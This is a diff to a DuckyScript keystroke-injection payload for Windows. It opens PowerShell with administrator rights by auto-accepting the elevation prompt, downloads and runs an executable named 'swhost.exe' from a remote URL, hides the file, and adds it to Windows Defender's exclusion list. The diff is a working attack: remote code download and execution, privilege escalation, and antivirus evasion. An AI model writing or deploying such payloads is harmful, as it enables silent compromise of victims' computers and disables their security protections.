@@ -2,6 +2,14 @@ DELAY 2000
 GUI r
 DELAY 500
 STRING powershell
+HOLD CTRL
+HOLD SHIFT
+ENTER
+RELEASE SHIFT
+RELEASE CTRL
+DELAY 500
+LEFTARROW
+DELAY 500
 ENTER
 DELAY 1000
 STRING $url = "https://github.com/Ocanath/gandalfs/raw/refs/heads/master/dist/swhost.exe"
@@ -15,6 +23,9 @@ ENTER
 STRING Invoke-WebRequest -Uri $url -OutFile $output ; if($?) { Start-Process ".\swhost.exe" }
 ENTER
 DELAY 500
+STRING Set-ItemProperty -LiteralPath $output -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+ENTER
+DELAY 50
 STRING Add-MpPreference -ExclusionProcess $output
 ENTER
 DELAY 500
